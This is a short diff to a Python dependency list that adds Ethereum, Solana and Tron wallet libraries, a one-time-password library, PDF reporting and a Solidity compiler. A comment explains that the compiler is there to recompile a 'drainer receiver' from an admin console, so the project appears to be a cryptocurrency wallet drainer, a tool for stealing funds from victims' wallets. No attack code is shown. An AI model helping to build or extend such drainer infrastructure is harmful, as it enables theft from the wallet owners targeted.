@@ -3,3 +3,15 @@ uvicorn>=0.28.0
 httpx>=0.27.0
 pydantic>=2.6.0
 cryptography>=42.0.0
+eth-account>=0.11.0
+eth-abi>=5.0.0
+eth-utils>=4.0.0
+solders>=0.21.0
+base58>=2.1.1
+tronpy>=0.5.0
+pyotp>=2.9.0
+# PDF report generation (optional)
+reportlab>=4.0.0
+# Recompiling the drainer receiver from the admin console (optional; the compiled
+# artifact is committed, so deployment needs no compiler)
+py-solc-x>=1.1.1
